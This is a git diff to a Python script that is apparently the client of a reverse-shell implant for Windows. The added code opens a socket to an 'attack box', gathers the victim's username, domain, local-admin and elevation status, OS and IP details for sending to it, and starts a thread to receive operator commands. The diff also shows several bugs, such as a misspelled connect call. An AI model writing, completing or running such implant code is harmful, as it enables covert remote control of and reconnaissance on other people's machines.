@@ -21,6 +21,20 @@ def startrevshellcli():
 
     exit_event.set()
 
+
+# Defines client reciever for commands coming from attack box
+def reciever(client):
+    while True:
+        try:
+            # Checks if the agent is alive and recieving data
+            data = client.recv(1024)
+        except:
+            print("[-] Connection to server lost...")
+            client.close
+            os.exit(0)
+        data=data.decode('utf-8') # Get commands we're sending from the attack box
+
+
 host="127.0.0.1"
 port=4545
 
@@ -74,10 +88,27 @@ if "Administrators" in gathering.stdout:
 
 
 if Domain == True:    
-    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + 
-    "\n" + "Domain Joined: " + str(Domain) + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " 
-    + "\n" + ipaddrinfo
+    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "Domain Info: " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
 else:
-    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " 
-    + str(Domain) + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
+    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "OS info: " + osinfo +"\n" + "IP address info: " + "\n" + ipaddrinfo
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.coonnect((host, port)) # Connects using port and IP address
+
+# INFO SENT TO SERVER:
+# if Domain == True:    
+#    info=os.environ["userdomain"] + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin()) +
+#  "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "Domain Info: 
+# " + domaininfo.stdout + "\n" + "OS info: " + osinfo + "\n" + "IP address info: " + "\n" + ipaddrinfo
+# else:
+#    info=os.environ.get('COMPUTERNAME') + "\\" + os.getlogin() + "\n[Elevated]: " + str(shell.IsUserAnAdmin())
+#  + "\nMember of Local Admins: " + str(Admin) + "\n" + "Domain Joined: " + str(Domain) + "\n" + "OS info: " + osinfo
+#  +"\n" + "IP address info: " + "\n" + ipaddrinfo
+
+handler_thread = threading.Thread(target=reciever, args=(client, ))
+handler_thread.daemon = True
+handler_thread.start()
+
+while True:
+    time.sleep(1)
 
